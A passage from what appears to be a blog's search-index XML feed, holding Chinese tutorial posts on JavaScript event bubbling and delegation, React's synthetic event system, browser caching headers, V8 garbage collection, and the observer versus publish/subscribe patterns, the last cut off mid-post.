        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>路由</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS事件冒泡和事件委托]]></title>
    <url>%2FJS%E4%BA%8B%E4%BB%B6%E5%86%92%E6%B3%A1%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%A7%94%E6%89%98.html</url>
    <content type="text"><![CDATA[最近在学习React的时候，看到了React实现合成事件的底层机制，事件委托一词赫然出现在眼前，于是我不由的想到在不久前的一次面试中，面试官曾让我写一个冒泡阶段的事件委托，今天借着对React的理解，再来深入探讨一下JS中的事件冒泡和事件委托。 事件流“DOM2级事件”规定的事件流包括三个阶段：事件捕获阶段，处于目标阶段和事件冒泡阶段。 阶段 描述 传播方向 事件捕获 不太具体的节点应该更早接收到事件，而具体的节点应该最后接收到事件 DOM树依次向下 事件冒泡 由最具体的元素开始接收，逐级向上传播到较为不具体的节点 DOM树向上 在DOM2级事件处理程序操作 addEventListener() 和 removeEventListener() 方法中，其第三个参数接收一个布尔值，用于指定事件处理程序在何时进行。 值为true：表示在捕获阶段调用事件处理程序 值为false：表示在冒泡阶段调用事件处理程序 这里是我们处在level菜鸟阶段最先接触到有关事件冒泡和事件捕获的方法了，但是由于事件捕获在浏览器的兼容情况并不乐观，所以大多数情况我们不建议在事件捕获阶段注册事件处理程序。 事件对象在正式开始介绍事件委托之前，我们先来了解一下事件对象。 触发DOM上的某个事件时，会产生一个事件对象event，这个对象中包含着所有与事件有关的信息。 这是红宝书里对事件对象的解释，下表列出了事件对象的部分属性和方法 。 属性 / 方法 类型 读 / 写 说明 type String 只读 被触发的事件的类型 target Element 只读 事件的目标 currentTarget Element 只读 其事件处理程序当前正在处理事件的那个元素 preventDefault() Function 只读 取消事件的默认行为 stopPropagation Function 只读 取消事件的进一步捕获或冒泡 stopImmediatePropagation Function 只读 取消事件的进一步捕获或冒泡，同时阻止任何事件处理程序被调用 target 和 currentTarget在事件处理程序内部，对象this始终等于currentTarget的值，而target则只包含事件的实际目标。 当事件处理程序直接指定给了目标元素，this、currentTarget、target包含相同的值。 12345var btn = document.getElementById(&quot;myBtn&quot;);btn.onclick = function(e) &#123; console.log(e.currentTarget === this); //true console.log(e.target === this); //true&#125; 当事件处理程序存在于按钮的父节点中，这三者的值不相同。 12345document.body.onclick = function(e) &#123; console.log(this === document.body); //true console.log(e.currentTarget === document.body); //true console.log(e.target === document.getElementById(&quot;myBtn&quot;)); //true;&#125; 上述例子中，click事件的真正目标是target的按钮元素，但由于没有在按钮元素上注册事件处理程序，所以click事件一只冒泡到了document.body后才被处理。 由上，我们可以得出更通俗的对target 和 currentTarget的解释。 target：当前被点击的实际元素 currentTarget：注册了事件处理程序的元素 peventDefault()1234var link = document.getElementById(&quot;myLink&quot;);link.onclick = function(e) &#123; e.preventDefault();&#125; 上述例子阻止了链接默认跳转到其href指定的URL。 FastClick原理说到阻止事件默认行为，不得不提移动端常用的FastClick。其实现原理是这样的： 注册业务onclick事件 在touchend阻止默认事件（屏蔽之后的click事件） 合成一个click事件，并立即执行 执行业务自己的click事件 下面可以看一个模拟FastClick的代码案例12345678910111213141516171819202122// 业务代码var $test = document.getElementById(&apos;test&apos;)$test.addEventListener(&apos;click&apos;, function () &#123; console.log(&apos;1 click&apos;)&#125;)// FastClick简单实现var targetElement = nulldocument.body.addEventListener(&apos;touchstart&apos;, function () &#123; // 记录点击的元素 targetElement = event.target&#125;)document.body.addEventListener(&apos;touchend&apos;, function (event) &#123; // 阻止默认事件（屏蔽之后的click事件） event.preventDefault() var touch = event.changedTouches[0] // 合成click事件，并添加可跟踪属性forwardedTouchEvent var clickEvent = document.createEvent(&apos;MouseEvents&apos;) clickEvent.initMouseEvent(&apos;click&apos;, true, true, window, 1, touch.screenX, touch.screenY, touch.clientX, touch.clientY, false, false, false, false, 0, null) clickEvent.forwardedTouchEvent = true // 自定义的 targetElement.dispatchEvent(clickEvent)&#125;) stopPropagation 和 stopImmediatePropagation12345678var btn = document.getElementById(&quot;myBtn&quot;);btn.onclick = function(e) &#123; alert(&quot;Clicked&quot;); e.stopPropagation();&#125;document.body.onclick = function(e) &#123; alert(&quot;Body clicked&quot;);&#125; 上述例子，在点击事件在目标元素上被执行后就阻止了冒泡，防止其传播到body。 1234567891011var btn = document.getElementById(&quot;myBtn&quot;);btn.addEventListener(&quot;click&quot;, function(e) &#123; alert(&quot;Clicked before&quot;); e.stopImmediatePropagation();&#125;, false);btn.addEventListener(&quot;click&quot;, function(e) &#123; alert(&quot;Clicked after&quot;);&#125;, false);document.body.addEventListener(&quot;click&quot;, function(e) &#123; alert(&quot;Body clicked&quot;);&#125;, false); 在上述例子中，使用了stopImmediatePropagation阻止冒泡，绑定在该按钮上的同类事件，没有执行完的也将被阻止。 事件委托事件委托利用了事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件。例如，click事件会一直冒泡到document层次，也就是是说我们可以为整个页面指定一个onclick事件处理程序，而不必给每个可单击元素分别添加事件处理程序。现在我们回到那个面试题，来写一个事件委托的方法。123456789101112/** * @param type：String，事件类型 * @param element：DOM element，目标元素 * @param callback：Function，业务事件处理程序*/ function eventHandler(type, element, callback) &#123; document.addEventListener(type, function(e)&#123; if(e.target === element) &#123; callback.call(this); &#125; &#125;, false);&#125; React 合成事件的实现原理React 合成事件是把所有事件绑定到结构的最外层，使用一个统一的事件监听器，以队列的方式，从触发事件的组件向父组件回溯，调用它们在JSX中声明的callback。其中涉及到几个重要的类如下： ReactEventListener：负责事件注册和事件分发。React将DOM事件全都注册到document这个节点上。事件分发主要调用dispatchEvent进行，从事件触发组件开始，向父元素遍历。 ReactEventEmitter：负责每个组件上事件的执行。 EventPluginHub：负责事件的存储，合成事件以对象池的方式实现创建和销毁，大大提高了性能。 SimpleEventPlugin等plugin：根据不同的事件类型，构造不同的合成事件。如focus对应的React合成事件为SyntheticFocusEvent 事件注册组件创建和更新的入口方法mountComponent和updateComponent都会调用_updateDOMProperties方法。123456789101112131415_updateDOMProperties: function (lastProps, nextProps, transaction) &#123; ... // 前面代码太长，省略一部分 else if (registrationNameModules.hasOwnProperty(propKey)) &#123; // 如果是props这个对象直接声明的属性，而不是从原型链中继承而来的，则处理它 // nextProp表示要创建或者更新的属性，而lastProp则表示上一次的属性 // 对于mountComponent，lastProp为null。updateComponent二者都不为null。unmountComponent则nextProp为null if (nextProp) &#123; // mountComponent和updateComponent中，enqueuePutListener注册事件 enqueuePutListener(this, propKey, nextProp, transaction); &#125; else if (lastProp) &#123; // unmountComponent中，删除注册的listener，防止内存泄漏 deleteListener(this, propKey); &#125; &#125;&#125; 下面我们来看enqueuePutListener，它负责注册JSX中声明的事件。源码如下123456789101112131415161718192021/ inst: React Component对象// registrationName: React合成事件名，如onClick// listener: React事件回调方法，如onClick=callback中的callback// transaction: mountComponent或updateComponent所处的事务流中，React都是基于事务流的function enqueuePutListener(inst, registrationName, listener, transaction) &#123; if (transaction instanceof ReactServerRenderingTransaction) &#123; return; &#125; var containerInfo = inst._hostContainerInfo; var isDocumentFragment = containerInfo._node &amp;&amp; containerInfo._node.nodeType === DOC_FRAGMENT_TYPE; // 找到document var doc = isDocumentFragment ? containerInfo._node : containerInfo._ownerDocument; // 注册事件，将事件注册到document上 listenTo(registrationName, doc); // 存储事件,放入事务队列中 transaction.getReactMountReady().enqueue(putListener, &#123; inst: inst, registrationName: registrationName, listener: listener &#125;);&#125; enqueuePutListener方法主要做了两件事，一是将JSX声明的事件注册到document元素上，一是将事件存储放入事务队列，以供事件触发时回调。listenTo代码虽然比较长，但逻辑很简单，调用trapCapturedEvent和trapBubbledEvent来注册捕获和冒泡事件。12345678910111213141516171819202122232425262728293031trapBubbledEvent: function (topLevelType, handlerBaseName, element) &#123; if (!element) &#123; return null; &#125; return EventListener.listen( element, // 绑定到的DOM目标,也就是document handlerBaseName, // eventType ReactEventListener.dispatchEvent.bind(null, topLevelType)); // callback, document上的原生事件触发后回调 &#125;, listen: function listen(target, eventType, callback) &#123; if (target.addEventListener) &#123; // 将原生事件添加到target这个dom上,也就是document上。 // 这就是只有document这个DOM节点上有原生事件的原因 target.addEventListener(eventType, callback, false); return &#123; // 删除事件,这个由React自己回调,不需要调用者来销毁。但仅仅对于React合成事件才行 remove: function remove() &#123; target.removeEventListener(eventType, callback, false); &#125; &#125;; &#125; else if (target.attachEvent) &#123; // attach和detach的方式 target.attachEvent(&apos;on&apos; + eventType, callback); return &#123; remove: function remove() &#123; target.detachEvent(&apos;on&apos; + eventType, callback); &#125; &#125;; &#125; &#125; 在listen方法中，我们终于发现了熟悉的addEventListener这个原生事件注册方法。只有document节点才会调用这个方法，故仅仅只有document节点上才有DOM事件。这大大简化了DOM事件逻辑，也节约了内存。 有关事件存储的过程我们就不是我们本文的重点，就跳过，有兴趣的可以去看一下参考链接中的文章。 事件执行在trapBubbledEvent中，我们看到listen最后执行的回调函数是dispatchEvent，这个方法就是React执行事件分发的入口。12345678910111213141516// topLevelType：带top的事件名，如topClick。不用纠结为什么带一个top字段，知道它是事件名就OK了// nativeEvent: 用户触发click等事件时，浏览器传递的原生事件dispatchEvent: function (topLevelType, nativeEvent) &#123; // disable了则直接不回调相关方法 if (!ReactEventListener._enabled) &#123; return; &#125; var bookKeeping = TopLevelCallbackBookKeeping.getPooled(topLevelType, nativeEvent); try &#123; // 放入批处理队列中,React事件流也是一个消息队列的方式 ReactUpdates.batchedUpdates(handleTopLevelImpl, bookKeeping); &#125; finally &#123; TopLevelCallbackBookKeeping.release(bookKeeping); &#125;&#125; 可见我们仍然使用批处理的方式进行事件分发，handleTopLevelImpl才是事件分发的真正执行者，它是事件分发的核心，体现了React事件分发的特点。123456789101112131415161718192021// document进行事件分发,这样具体的React组件才能得到响应。因为DOM事件是绑定到document上的function handleTopLevelImpl(bookKeeping) &#123; // 找到事件触发的DOM和React Component var nativeEventTarget = getEventTarget(bookKeeping.nativeEvent); var targetInst = ReactDOMComponentTree.getClosestInstanceFromNode(nativeEventTarget); // 执行事件回调前,先由当前组件向上遍历它的所有父组件。得到ancestors这个数组。 // 因为事件回调中可能会改变Virtual DOM结构,所以要先遍历好组件层级 var ancestor = targetInst; do &#123; bookKeeping.ancestors.push(ancestor); ancestor = ancestor &amp;&amp; findParent(ancestor); &#125; while (ancestor); // 从当前组件向父组件遍历,依次执行注册的回调方法. 我们遍历构造ancestors数组时,是从当前组件向父组件回溯的,故此处事件回调也是这个顺序 // 这个顺序就是冒泡的顺序,并且我们发现不能通过stopPropagation来阻止&apos;冒泡&apos;。 for (var i = 0; i &lt; bookKeeping.ancestors.length; i++) &#123; targetInst = bookKeeping.ancestors[i]; ReactEventListener._handleTopLevel(bookKeeping.topLevelType, targetInst, bookKeeping.nativeEvent, getEventTarget(bookKeeping.nativeEvent)); &#125;&#125; 事件处理由_handleTopLevel完成。1234567// React事件调用的入口。DOM事件绑定在了document原生对象上,每次事件触发,都会调用到handleTopLevelhandleTopLevel: function (topLevelType, targetInst, nativeEvent, nativeEventTarget) &#123; // 采用对象池的方式构造出合成事件。不同的eventType的合成事件可能不同 var events = EventPluginHub.extractEvents(topLevelType, targetInst, nativeEvent, nativeEventTarget); // 批处理队列中的events runEventQueueInBatch(events);&#125; React的合成事件机制还是比较复杂的，这里只是部分，但是也可是大致感受到它从自动委托到分发执行的过程，希望对大家理解有所帮助。 参考链接：React源码分析7 — React合成事件系统]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器缓存策略]]></title>
    <url>%2F%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%AD%96%E7%95%A5.html</url>
    <content type="text"><![CDATA[开发的时候，我们常常会遇到因为缓存而导致页面修改没有及时展示的情况，这个时候我们不禁就会思考，为什么有时候页面缓存了，有时候页面没有缓存，究竟如何正确使用缓存，如何快速定位问题是否由缓存导致，本文我们就来深入理解下浏览器的缓存机制。 缓存简介所谓缓存，就是浏览器将一些资源存放在用户磁盘或内存中的行为。根据缓存存放的位置不同，可以将缓存分为 内存缓存 和 硬盘缓存, 根据缓存的策略不同，可以分为 强制缓存 和 协商缓存。 浏览器与服务器通信的方式为应答模式，即是：浏览器发起HTTP请求 – 服务器响应该请求。那么浏览器第一次向服务器发起该请求后拿到请求结果，会根据响应报文中HTTP头的缓存标识，决定是否缓存结果，是则将请求结果和缓存标识存入浏览器缓存中，简单的过程如下图 浏览器发起请求，检查缓存中是否含有所需资源和缓存标识 当没有需要的缓存资源，则向服务器发起请求 服务器返回资源 浏览器根据缓存标识决定是否需要将资源保存在缓存中 下面我们先来看看 内存缓存 和 硬盘缓存。 内存缓存/硬盘缓存内存缓存(from memory cache)内存缓存具有两个特点，分别是快速读取和时效性： 快速读取：内存缓存会将编译解析后的文件，直接存入该进程的内存中，占据该进程一定的内存资源，以方便下次运行使用时的快速读取。 时效性：一旦该进程关闭，则该进程的内存则会清空。 硬盘缓存(from disk cache)硬盘缓存则是直接将缓存写入硬盘文件中，读取缓存需要对该缓存存放的硬盘文件进行I/O操作，然后重新解析该缓存内容，读取复杂，速度比内存缓存慢。 两者比较 浏览器读取命中强缓存资源的顺序为memory –&gt; disk： 先去内存看，如果有，直接加载； 如果内存没有，则取硬盘获取，如果有直接加载； 如果硬盘也没有，那么就进行网络请求； 加载到的资源缓存到硬盘和内存。 类型 时效性 容量 存放内容 内存缓存 进程关闭，内存清空 小 脚本、字体、图片等 硬盘缓存 时效长 大 CSS等 由上可以看出内存缓存中大多存放JS、图片等资源，而硬盘缓存中大多存放CSS资源以及容量较大的资源，这是因为： CSS样式加载一次即可渲染出网页。 脚本可能随时会执行，如果脚本在磁盘当中，在执行该脚本需要从磁盘中取到内存当中来。这样的IO开销是比较大的，有可能会导致浏览器失去响应。 强制缓存强制缓存就是向浏览器缓存查找该请求结果，并根据该结果的缓存规则来决定是否使用该缓存结果的过程。 三种情况 不存在该缓存结果和缓存标识，强制缓存失效，则直接向服务器发起请求（跟第一次发起请求一致），如下图 存在该缓存结果和缓存标识，但该结果已失效，强制缓存失效，则使用协商缓存(暂不分析)，如下图 存在该缓存结果和缓存标识，且该结果尚未失效，强制缓存生效，直接返回该结果，如下图 ExpiresExpires是HTTP/1.0控制网页缓存的字段，其值为服务器返回该请求结果缓存的到期时间，即再次发起该请求时，如果客户端的时间小于Expires的值时，直接使用缓存结果。到了HTTP/1.1，Expire已经被Cache-Control替代，原因在于Expires控制缓存的原理是使用客户端的时间与服务端返回的时间做对比，那么如果客户端与服务端的时间因为某些原因（例如时区不同；客户端和服务端有一方的时间不准确）发生误差，那么强制缓存则会直接失效，这样的话强制缓存的存在则毫无意义。 Cache-Control在HTTP/1.1中，Cache-Control是最重要的规则，主要用于控制网页缓存，主要取值为： public：所有内容都将被缓存（客户端和代理服务器都可缓存） private：所有内容只有客户端可以缓存，Cache-Control的默认取值 no-cache：客户端缓存内容，但是是否使用缓存则需要经过协商缓存来验证决定 no-store：所有内容都不会被缓存，即不使用强制缓存，也不使用协商缓存 max-age=xxx (xxx is numeric)：缓存内容将在xxx秒后失效 Cache-Control的优先级高于Expires，Cache-Control的是相对值，而Expires是绝对值，在不确客户端和服务端时间是否一致的情况下，推荐优先使用Cache-Control。 协商缓存协商缓存就是强制缓存失效后，浏览器携带缓存标识向服务器发起请求，由服务器根据缓存标识决定是否使用缓存的过程。 两种情况 协商缓存生效，返回304，如下 协商缓存失效，返回200和请求结果结果，如下 Last-Modified / If-Modified-Since Last-Modified：是服务器响应请求时，返回该资源文件在服务器最后被修改的时间 If-Modified-Since：则是客户端再次发起该请求时，携带上次请求返回的Last-Modified值，通过此字段值告诉服务器该资源上次请求返回的最后被修改时间。服务器收到该请求，发现请求头含有If-Modified-Since字段，则会根据If-Modified-Since的字段值与该资源在服务器的最后被修改时间做对比，若服务器的资源最后被修改时间大于If-Modified-Since的字段值，则重新返回资源，状态码为200；否则则返回304，代表资源无更新，可继续使用缓存文件 Etag / If-None-Match Etag：是服务器响应请求时，返回当前资源文件的一个唯一标识(由服务器生成) If-None-Match：是客户端再次发起该请求时，携带上次请求返回的唯一标识Etag值，通过此字段值告诉服务器该资源上次请求返回的唯一标识值。服务器收到该请求后，发现该请求头中含有If-None-Match，则会根据If-None-Match的字段值与该资源在服务器的Etag值做对比，一致则返回304，代表资源无更新，继续使用缓存文件；不一致则重新返回资源文件，状态码为200 Etag / If-None-Match优先级高于Last-Modified / If-Modified-Since，同时存在则只有Etag / If-None-Match生效。 完整缓存流程 请求访问缓存 若存在Expires和Cache-Control，则进行强制缓存 若存在Etag / If-None-Match，则进行协商缓存 若存在Last-Modified / If-Modified-Since，则进行协商缓存 若不存在缓存标识，则向服务器请求资源，并将返回资源及缓存标志放入缓存中 实际应用了解了缓存机制，我们就来看看缓存能用来做什么。在我们网页开发过程中，为了实现各种交互功能和页面的美化，我们会引入不少资源，但是在反复加载的过程中，如果我们不断向服务器去请求这些资源，会降低网站的性能，尤其当这些资源的容量较大时，这一性能缺陷就会更为明显，所以我们可以利用设置缓存标志，将那些不常更新，容量较大的资源保存在缓存里，加快网站的再次渲染。 在服务器设置Etag / If-None-Match或Last-Modified / If-Modified-Since，采用协商缓存，可以减少从服务器返回资源的次数，但还是需要多次请求访问服务端 在服务器设置Expires或Cache-Control，直接从缓存中获取资源，更大提升了性能 以上就是有关缓存机制的全部内容，有理解不到位的地方，欢迎各位大佬指正。 参考链接：彻底理解浏览器的缓存机制前端性能优化-HTTP添加Expires头]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[V8垃圾回收机制]]></title>
    <url>%2FV8%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6.html</url>
    <content type="text"><![CDATA[前言在类似C/C++等语言的开发中，程序员不可避免需要跟踪内存的使用情况以此来降低内存占用，提高程序的性能，而对于JavaScript，JavaScript具有自动垃圾收集机制，这就意味着程序员不用关心内存使用问题，垃圾收集器会按照固定的时间间隔，找出不再继续使用的内存，自动将其释放。本文就一同来探索垃圾回收的原理。 垃圾收集两种策略标记清除当变量进入环境（例如，在函数中声明一个变量）时，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。可以使用任何方式来标记变量。比如，可以通过翻转某个特殊的位来记录一个变量何时进入环境，或者使用一个“进入环境的”变量列表及一个“离开环境的”变量列表来跟踪哪个变量发生了变化。如何标记变量并不重要，关键在于采取什么策略。 运行机制： 垃圾收集器在运行时给存储在内存中的所有变量都加上标记。 去掉环境中的变量以及被环境中的变量引用的变量的标记。 被加上标记的变量被视为准备删除的变量。 垃圾收集器完成内存清楚，销毁带标记的值并回收所占用的内存空间。 目前，IE、Firefox、Opera、Chrome和Safari的JavaScript实现使用的都是标记清除式的垃圾回收策略（或类似的策略），只不过垃圾收集的时间间隔互有不同。 引用计数引用计数含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量改变了引用对象，则该值引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾收集器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。 运行机制： 将引用类型复制给变量，引用次数+1。 包含该引用的变量获取了其他值，引用次数-1。 引用次数为0的变量为需要回收的值。 垃圾收集器释放引用次数为0的值所占用内存。 循环引用引用计数遇到的最大问题，就是循环引用。循环引用指的是对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的引用。这个现象在使用BOM和DOM对象时尤其明显。1234var element = document.getElementById(&quot;some_element&quot;);element.onlick = function(e)&#123; console.log(e.target);&#125;; 在element对象的onclick属性上指向了一个函数，而在函数传入的变量对象上，可以访问到element的信息，这里就产生了循环引用，element将永远不会被收回。如想要使其被回收则需要作如下操作。1element.onclick = null; 弱引用在上个小节里，我们提到了BOM和DOM对象大多存在循环引用的问题，这里就顺便补充下关于ES6的知识。我们知道在ES6里新提出了两种数据集合类型： Set 和 Map 。他们类似于数组，但他们的成员的值一定是唯一的，没有重复值。而为了针对浏览器的垃圾回收机制，这两个数据结构引入了 弱引用 概念又扩展出了 WeakSet 和 WeakMap 。 弱引用指的是垃圾回收机制不考虑WeakSet和WeakMap对该对象的引用，也就是说，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于WeakSet或WeakMap之中。WeakSet和WeakMap里面的引用，都不计入垃圾回收机制。 WeakSet不能遍历，是因为成员都是弱引用，随时可能消失，遍历机制无法保证成员的存在，很可能刚刚遍历结束，成员就取不到了。WeakSet的一个用处，是储存DOM节点，而不用担心这些节点从文档移除时，会引发内存泄漏。 123456789101112const foos = new WeakSet() class Foo &#123; constructor() &#123; foos.add(this) &#125; method () &#123; if (!foos.has(this)) &#123; throw new TypeError(&apos;Foo.prototype.method 只能在Foo的实例上调 用！&apos;); &#125; &#125; &#125;//保证了Foo的实例方法，只能在Foo的实例上调用。 在网页的DOM元素上添加数据，就可以使用WeakMap结构。当该DOM元素被清除，其所对应的WeakMap记录就会自动被移除。 123456const e1 = document.getElementById(&apos;foo&apos;); const e2 = document.getElementById(&apos;bar&apos;); const arr = [ [e1, &apos;foo 元素&apos;], [e2, &apos;bar 元素&apos;], ]; V8垃圾回收策略V8采用了一种代回收的策略，将内存分为两个生代：新生代（new generation） 和 老生代（old generation）。新生代中的对象为存活时间较短的对象，老生代中的对象为存活时间较长或常驻内存的对象，分别对新老生代采用不同的垃圾回收算法来提高效率，对象最开始都会先被分配到新生代（如果新生代内存空间不够，直接分配到老生代），新生代中的对象会在满足某些条件后，被移动到老生代，这个过程也叫晋升。 分代内存默认情况下，32位系统新生代内存大小为16MB，老生代内存大小为700MB，64位系统下，新生代内存大小为32MB，老生代内存大小为1.4GB。 新生代平均分成两块相等的内存空间，叫做semispace，每块内存大小8MB（32位）或16MB（64位）。 新生代介绍新生代存的都是生存周期短的对象，分配内存也很容易，只保存一个指向内存空间的指针，根据分配对象的大小递增指针就可以了，当存储空间快要满时，就进行一次垃圾回收。 Scavenge算法新生代采用Scavenge垃圾回收算法，在算法实现时主要采用Cheney算法。 Cheney算法将内存一分为二，叫做semispace，一块处于使用状态，一块处于闲置状态。处于使用状态的semispace称为From空间，处于闲置状态的semispace称为To空间。 在From空间中分配了3个对象A、B、C。 GC进来判断对象B没有其他引用，可以回收，对象A和C依然为活跃对象。 将活跃对象A、C从From空间复制到To空间。 清空From空间的全部内存。 交换From空间和To空间。 在From空间中又新增了2个对象D、E。 下一轮GC进来发现对象D没有引用了，做标记。 将活跃对象A、C、E从From空间复制到To空间。 清空From空间全部内存。 继续交换From空间和To空间，开始下一轮。 通过上面的流程图，我们可以很清楚的看到，进行From和To交换，就是为了让活跃对象始终保持在一块semispace中，另一块semispace始终保持空闲的状态。Scavenge由于只复制存活的对象，并且对于生命周期短的场景存活对象只占少部分，所以它在时间效率上有优异的体现。Scavenge的缺点是只能使用堆内存的一半，这是由划分空间和复制机制所决定的。由于Scavenge是典型的牺牲空间换取时间的算法，所以无法大规模的应用到所有的垃圾回收中。但我们可以看到，Scavenge非常适合应用在新生代中，因为新生代中对象的生命周期较短，恰恰适合这个算法。 晋升当一个对象经过多次复制仍然存活时，它就会被认为是生命周期较长的对象。这种较长生命周期的对象随后会被移动到老生代中，采用新的算法进行管理。对象从新生代移动到老生代的过程叫作晋升。 对象晋升的条件主要有两个： 对象从From空间复制到To空间时，会检查它的内存地址来判断这个对象是否已经经历过一次Scavenge回收。如果已经经历过了，会将该对象从From空间移动到老生代空间中，如果没有，则复制到To空间。总结来说，如果一个对象是第二次经历从From空间复制到To空间，那么这个对象会被移动到老生代中。 当要从From空间复制一个对象到To空间时，如果To空间已经使用了超过25%，则这个对象直接晋升到老生代中。设置25%这个阈值的原因是当这次Scavenge回收完成后，这个To空间会变为From空间，接下来的内存分配将在这个空间中进行。如果占比过高，会影响后续的内存分配。 老生代介绍在老生代中，存活对象占较大比重，如果继续采用Scavenge算法进行管理，就会存在两个问题： 由于存活对象较多，复制存活对象的效率会很低。 采用Scavenge算法会浪费一半内存，由于老生代所占堆内存远大于新生代，所以浪费会很严重。 所以，V8在老生代中主要采用了Mark-Sweep和Mark-Compact相结合的方式进行垃圾回收。 Mark-SweepMark-Sweep是标记清除的意思，它分为标记和清除两个阶段。与Scavenge不同，Mark-Sweep并不会将内存分为两份，所以不存在浪费一半空间的行为。Mark-Sweep在标记阶段遍历堆内存中的所有对象，并标记活着的对象，在随后的清除阶段，只清除没有被标记的对象。也就是说，Scavenge只复制活着的对象，而Mark-Sweep只清除死了的对象。活对象在新生代中只占较少部分，死对象在老生代中只占较少部分，这就是两种回收方式都能高效处理的原因。 老生代中有对象A、B、C、D、E、F GC进入标记阶段，将A、C、E标记为存活对象 GC进入清除阶段，回收掉死亡的B、D、F对象所占用的内存空间 可以看到，Mark-Sweep最大的问题就是，在进行一次清除回收以后，内存空间会出现不连续的状态。这种内存碎片会对后续的内存分配造成问题。如果出现需要分配一个大内存的情况，由于剩余的碎片空间不足以完成此次分配，就会提前触发垃圾回收，而这次回收是不必要的。 Mark-Compact为了解决Mark-Sweep的内存碎片问题，Mark-Compact就被提出来了。Mark-Compact是标记整理的意思，是在Mark-Sweep的基础上演变而来的。Mark-Compact在标记完存活对象以后，会将活着的对象向内存空间的一端移动，移动完成后，直接清理掉边界外的所有内存。 老生代中有对象A、B、C、D、E、F（和Mark—Sweep一样） GC进入标记阶段，将A、C、E标记为存活对象（和Mark—Sweep一样） GC进入整理阶段，将所有存活对象向内存空间的一侧移动，灰色部分为移动后空出来的空间 GC进入清除阶段，将边界另一侧的内存一次性全部回收 两者结合在V8的回收策略中，Mark-Sweep和Mark-Conpact两者是结合使用的。由于Mark-Conpact需要移动对象，所以它的执行速度不可能很快，在取舍上，V8主要使用Mark-Sweep，在空间不足以对从新生代中晋升过来的对象进行分配时，才使用Mark-Compact。 参考链接：聊聊V8引擎的垃圾回收（leocoder）]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>WEB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[观察者模式与发布订阅模式]]></title>
    <url>%2F%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F%E4%B8%8E%E5%8F%91%E5%B8%83%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[关于观察者模式与发布/订阅模式，不少大神都有帖子对他们做出了解释，但是很多文章都将两者混在了一起，认为他们就是同一种模式，实际上这两者还是有些差异的，所以本文就从我在谷歌的查阅和个人的理解，来仔细讲讲这两种模式，已经他们的一些应用场景。 观察者模式官方给出的观察者模式的解释是这样的： 定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都得到通知并被自动更新。 观察者模式实现的，其实就是当目标对象的某个属性发生了改变，所有依赖着目标对象的观察者都将接到通知，做出相应动作。所以在目标对象的抽象类里，会保存一个观察者序列。当目标对象的属性发生改变生，会从观察者队列里取观察者调用各自的方法。 优点 观察者和被观察者是抽象耦合的。 建立一套触发机制。 缺点 如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。 如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。 观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。 下面通过一张图来看一下观察者模式的实现。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556class Subject &#123; let observers = []; let state; getState() &#123; return this.state; &#125; setState(state) &#123; this.state = state; notifyAllObservers(); &#125; attach(observer)&#123; observers.push(observer); &#125; notifyAllObservers()&#123; for (observer in observers) &#123; observer.update(); &#125; &#125; &#125;class Observer &#123; let subject; update();&#125;class BinaryObserver extends Observer &#123; constructor(subject) &#123; super(); subject.attach(this); &#125; update() &#123; console.log(&quot;Binary&quot;); &#125;&#125;class OctalObserver extends Observer &#123; constructor(subject) &#123; super(); subject.attach(this); &#125; update() &#123; console.log(&quot;Octal&quot;); &#125;&#125;var subject = new Subject(); var binaryObserver = new BinaryObserver(subject);var octalObserver = new OctalObserver(subject);subject.setState(15);//Binary//Octal 发布/订阅模式在很多文章里讲到的观察者模式，其实说的都是发布订阅模式，那么他们的差别到底在哪里呢，让我们一点点往下看。维基中对于发布/订阅是这样描述的： 发布-订阅是一种消息范式，消息的发送者（称为发布者）不会将消息直接发送给特定的接收者（称为订阅者）。而是将发布的消息分为不同的类别，无需了解哪些订阅者（如果有的话）可能存在。同样的，订阅者可以表达对一个或多个类别的兴趣，只接收感兴趣的消息，无需了解哪些发布者（如果有的话）存在。 也就是说，发布/订阅模式和观察者最大的差别就在于消息是否通过一个中间类进行转发。 优点 相较于观察者模式，发布/订阅发布者和订阅者的耦合性更低 通过并行操作，消息缓存，基于树或基于网络的路由等技术，发布/订阅提供了比传统的客户端–服务器更好的可扩展性 缺点 当中间类采用定时发布通知时，使用发布订阅无法确定所有订阅者是否都成功收到通知 当负载激增，请求订阅的订阅者数量增加，每个订阅者接收到通知的速度将会变慢 两种模式的区别由上，我们就可以得出这两者的区别了： 发布/订阅模式相比于观察者模式多了一个中间媒介，因为这个中间媒介，发布者和订阅者的关联更为松耦合 